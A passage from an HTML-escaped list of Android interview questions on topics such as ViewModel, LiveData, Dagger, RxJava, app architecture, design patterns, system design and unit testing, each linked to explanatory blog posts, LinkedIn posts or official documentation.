 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is a ViewModel and how is it useful?&lt;/strong&gt; Learn: &lt;a href="https://youtu.be/ORtieK5f_zg"&gt;What is a ViewModel and how is it useful?&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;SharedViewModel in Android&lt;/strong&gt; Learn: &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineering-tech-activity-7262328327531577344-fwSE"&gt;SharedViewModel in Android&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What are Android Architecture Components?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;StateFlow vs LiveData in Android Development&lt;/strong&gt; Learn: &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-softwareengineer-tech-activity-7316320147646885888-ZpyD"&gt;StateFlow vs LiveData&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is LiveData in Android?&lt;/strong&gt; &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineer-tech-activity-7371905311613509632-dGPM"&gt;What is LiveData in Android?&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How is LiveData different from ObservableField?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is the difference between setValue and postValue in LiveData?&lt;/strong&gt; Learn: &lt;a href="https://www.linkedin.com/posts/outcomeschool_softwareengineer-androiddev-android-activity-7274283452563107840-SXXl"&gt;setValue() vs postValue() in LiveData&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How do you share ViewModel between Fragments in Android?&lt;/strong&gt; Learn: &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineering-tech-activity-7262328327531577344-fwSE"&gt;SharedViewModel in Android&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Explain WorkManager and its use cases.&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Minimum repeat interval allowed when scheduling a PeriodicWorkRequest using WorkManager&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_androiddev-kotlin-activity-7314239540246810625-Xu0T"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How Does WorkManager Guarantee Task Execution?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_how-does-workmanager-guarantee-task-execution-activity-7320301933691310080-GpCR"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How does ViewModel work internally?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Others&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is the difference between Serializable and Parcelable? Which is the best approach in Android?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/parcelable-vs-serializable"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Why Bundle class is used for data passing and why cannot we use simple Map data structure?&lt;/strong&gt; - &lt;a href="https://developer.android.com/guide/components/activities/parcelables-and-bundles"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How do you troubleshoot a crashing application?&lt;/strong&gt; - &lt;a href="https://developer.android.com/topic/performance/vitals/crash"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Explain the Android push notification system?&lt;/strong&gt; Learn from here: &lt;a href="https://youtu.be/810IFG2sWlc"&gt;How does the Android push notification system work?&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is AAPT?&lt;/strong&gt; - &lt;a href="https://developer.android.com/studio/command-line/aapt2"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;FlatBuffers vs JSON.&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;&lt;code&gt;HashMap&lt;/code&gt;, &lt;code&gt;ArrayMap&lt;/code&gt; and &lt;code&gt;SparseArray&lt;/code&gt;&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/optimization-using-arraymap-and-sparsearray"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Advantages of SparseArray in Android&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-softwareengineer-tech-activity-7370662503024025600-rhVN"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What are Annotations?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/creating-custom-annotations"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How to create custom Annotation?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/creating-custom-annotations"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is the Android Support Library? Why was it introduced?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_androiddev-activity-7275725268680392705-waUi"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is Android Data Binding?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Android Libraries&lt;/h3&gt; 
&lt;p&gt;Android Interview Questions and Answers:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Explain OkHttp Interceptor&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/okhttp-interceptor"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;OkHttp - HTTP Caching&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/caching-with-okhttp-interceptor-and-retrofit"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How to enable logging in OkHttp?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_softwareengineer-androiddev-android-activity-7274652524433850368-qC4D"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Why do we use the Dependency Injection Framework like Dagger in Android?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_androiddev-activity-7038019147737276417-tH4s"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Explain @ Inject, @ Module, @ Provides, @ Component Annotations in Dagger 2&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_androiddev-android-kotlin-activity-7318124163481628673-EAYM"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How does the Dagger work?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How will you choose between Dagger 2 and Dagger-Hilt?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is a Component in Dagger?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is Module in Dagger?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How does the custom scope work in Dagger?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;When to call dispose and clear on CompositeDisposable in RxJava?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/dispose-vs-clear-compositedisposable-rxjava"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is Multipart Request in Networking?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is Flow in Kotlin?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/flow-api-in-kotlin"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;App Startup Library&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/app-startup-library"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Tell me something about RxJava.&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How will you handle error in RxJava?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;FlatMap Vs Map Operator&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/rxjava-map-vs-flatmap"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;When to use &lt;code&gt;Create&lt;/code&gt; operator and when to use &lt;code&gt;fromCallable&lt;/code&gt; operator of RxJava?&lt;/strong&gt; - Learn from here: &lt;a href="https://outcomeschool.com/blog/rxjava-create-and-fromcallable-operator"&gt;RxJava Create and fromCallable Operator&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;When to use &lt;code&gt;defer&lt;/code&gt; operator of RxJava?&lt;/strong&gt; - Learn from here: &lt;a href="https://outcomeschool.com/blog/rxjava-defer-operator"&gt;RxJava Defer Operator&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How are Timer, Delay, and Interval operators used in RxJava?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/rxjava-interval-operator"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How to make two network calls in parallel using RxJava?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/rxjava-zip-operator"&gt;RxJava Zip Operator&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Tell the difference between Concat and Merge.&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/rxjava-concat-operator"&gt;Learn from here&lt;/a&gt; and &lt;a href="https://outcomeschool.com/blog/rxjava-merge-operator"&gt;here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Explain Subject in RxJava?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/rxjava-subject-publish-replay-behavior-async"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What are the types of Observables in RxJava?&lt;/strong&gt; - Learn from here: &lt;a href="https://outcomeschool.com/blog/types-of-observables-in-rxjava"&gt;Types Of Observables In RxJava&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How to implement search feature using RxJava in your application?&lt;/strong&gt; - Learn from here: &lt;a href="https://outcomeschool.com/blog/instant-search-using-rxjava-operators"&gt;Instant Search Using RxJava Operators&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Pagination In RecyclerView Using RxJava Operators&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/pagination-in-recyclerview-using-rxjava-operators"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How The Android Image Loading Library Glide and Fresco Works?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/android-image-loading-library-optimize-memory-usage"&gt;Learn from here&lt;/a&gt;, &lt;a href="https://outcomeschool.com/blog/android-image-loading-library-use-bitmap-pool-for-responsive-ui"&gt;here&lt;/a&gt; and &lt;a href="https://outcomeschool.com/blog/android-image-loading-library-solve-the-slow-loading-issue"&gt;here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Difference between Schedulers.io() and Schedulers.computation() in RxJava.&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Android Architecture&lt;/h3&gt; 
&lt;p&gt;Android Interview Questions and Answers:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Describe the architecture of your last app.&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Describe MVVM.&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/mvvm-architecture-android"&gt;MVVM Architecture&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;MVC vs MVP vs MVVM architecture.&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Clean Architecture&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_androiddev-kotlin-activity-7123192186627571714-6143"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;MVI&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-softwareengineering-tech-activity-7288428333430644738-muDc"&gt;MVI (Model-View-Intent) Architecture in Android&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Software Architecture vs Software Design&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineering-tech-activity-7230434583584858112-mMEG"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Benefits of Multi-Module Architecture&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_androiddev-activity-7371759614591234048-oVH4"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Multi-Module Project: Why and When?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineer-tech-activity-7317400201558663173-n-LA"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Design Pattern&lt;/h3&gt; 
&lt;p&gt;Android Interview Questions and Answers&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Builder&lt;/strong&gt; - &lt;a href="https://outcomeschool.substack.com/p/design-patterns-in-android-libraries"&gt;Learn from here&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Singleton&lt;/strong&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Factory&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-softwareengineer-tech-activity-7300164529571733505-MYfP"&gt;Learn from here&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Observer&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineer-tech-activity-7298657173910233089-3qzw"&gt;Learn from here&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Repository&lt;/strong&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Adapter&lt;/strong&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Facade&lt;/strong&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Dependency Injection&lt;/strong&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Design Pattern used in Android&lt;/strong&gt; - &lt;a href="https://outcomeschool.substack.com/p/design-patterns-in-android-libraries"&gt;Learn from here&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Kotlin Optional Parameters vs Builder Pattern&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_softwareengineer-androiddev-android-activity-7270656113845370881-LDW8"&gt;Learn from here&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Examples of the Observer pattern used in Android&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_androiddev-activity-7288114509120970752-Z6c8"&gt;Learn from here&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Design Pattern Used in Retrofit Library Source Code&lt;/strong&gt; - &lt;a href="https://outcomeschool.substack.com/p/design-patterns-in-android-libraries"&gt;Learn from here&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Design Pattern used in Glide (Image Loading Library)&lt;/strong&gt; - &lt;a href="https://outcomeschool.substack.com/p/design-patterns-in-android-libraries"&gt;Learn from here&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Design Patterns used in AOSP (Android Open Source Project)&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-softwareengineer-tech-activity-7373202625908936704-7FKH"&gt;Learn from here&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Android System Design&lt;/h3&gt; 
&lt;p&gt;Android Interview Questions and Answers:&lt;/p&gt; 
&lt;p&gt;Refer to this blog: &lt;a href="https://outcomeschool.com/blog/android-system-design-interviews"&gt;&lt;strong&gt;Android System Design Interviews&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Design an Image Loading Library&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/android-image-loading-library-optimize-memory-usage"&gt;Learn from here&lt;/a&gt;, &lt;a href="https://outcomeschool.com/blog/android-image-loading-library-use-bitmap-pool-for-responsive-ui"&gt;here&lt;/a&gt; and &lt;a href="https://outcomeschool.com/blog/android-image-loading-library-solve-the-slow-loading-issue"&gt;here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Design File Downloader Library&lt;/strong&gt; - &lt;a href="https://github.com/amitshekhariitbhu/PRDownloader"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Design WhatsApp&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Design Instagram Stories&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Design Networking Library&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Design Facebook Near-By Friends App&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Design Caching Library.&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Design problems based on location-based app&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How to build an offline-first app? Explain the architecture&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Design LRU Cache&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Design Analytics Library&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;HTTP Request vs HTTP Long-Polling vs WebSocket vs Server-Sent Events&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/http-request-long-polling-websocket-sse"&gt;Learn from blog&lt;/a&gt; and &lt;a href="https://www.youtube.com/watch?v=8ksWRX4xV-s"&gt;Video - HTTP Request vs HTTP Long-Polling vs WebSocket vs Server-Sent Events&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How do Voice And Video Call Work?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/voice-and-video-call"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;In an Android App, how do you handle data syncing when the network isn’t stable?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_androiddev-interview-activity-7369017963754029056-G8Gv"&gt;Handling Android Data Sync on Unstable Networks&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Design Uber App&lt;/strong&gt; - &lt;a href="https://github.com/amitshekhariitbhu/ridesharing-uber-lyft-app"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Database Normalization vs Denormalization&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/database-normalization-vs-denormalization"&gt;Database Normalization vs Denormalization&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Hash vs Encrypt vs Encode&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineering-activity-7249769459790323712-ZF0O"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Webhook vs Polling&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_softwareengineer-activity-7265962230553223168-fsPx"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Options for real-time updates in an Android App&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_androiddev-android-activity-7287460425212866560-dJNB"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Options for Network Optimization in a Mobile App&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineering-tech-activity-7287470994447900672-XYM9"&gt;Options for Network Optimization in a Mobile App&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Firebase Remote Config in Android&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineering-tech-activity-7288408601944043520-pHZX"&gt;Firebase Remote Config in Android&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Accurate time in Android&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineer-tech-activity-7298341712634990592-tgyR"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Query Optimization in SQLite for Better Performance&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-softwareengineer-tech-activity-7299289876846284801-3gfH"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;WebSocket vs Socket.IO&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineer-tech-activity-7371027069046030336-OcIC"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Symmetric vs Asymmetric Encryption&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_symmetric-vs-asymmetric-encryption-activity-7308873320894996481-a43E"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;SMS Retriever API in Android&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_sms-retriever-api-in-android-activity-7309171578796224513-YRab"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Android Unit Testing&lt;/h3&gt; 
&lt;p&gt;Android Interview Questions and Answers:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Unit Testing ViewModel with Kotlin Coroutines and LiveData&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/unit-testing-viewmodel-with-kotlin-coroutines-and-livedata"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Unit Testing ViewModel with Kotlin Flow and StateFlow&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/unit-testing-viewmodel-with-kotlin-flow-and-stateflow"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is Espresso?&lt;/strong&gt; - &lt;a href="https://developer.android.com/training/testing/espresso/basics"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is Robolectric?&lt;/strong&gt; - &lt;a href="http://robolectric.org/"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What are the disadvantages of using Robolectric?&lt;/strong&gt; - &lt;a href="https://stackoverflow.com/questions/18271474/robolectric-vs-android-test-framework"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is UI-Automator?&lt;/strong&gt; - &lt;a href="https://developer.android.com/training/testing/ui-testing/uiautomator-testing.html"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Explain the unit test.&lt;/strong&gt; - &lt;a href="https://developer.android.com/training/testing/unit-testing/local-unit-tests"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Explain instrumented test.&lt;/strong&gt; - &lt;a href="https://developer.android.com/training/testing/unit-testing/instrumented-unit-tests"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Why Mockito is used?&lt;/strong&gt; - &lt;a href="http://site.mockito.org/"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Describe code coverage.&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineer-tech-activity-7298564060105609217-8zXA"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Android Tools And Technologies&lt;/h3&gt; 
&lt;p&gt;Android Interview Questions and Answers:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;CI/CD Pipeline for Android&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_softwareengineer-androiddev-android-activity-7294600775178063872-Q0oY/"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is ADB?&lt;/strong&gt; - &lt;a href="https://developer.android.com/studio/command-line/adb"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
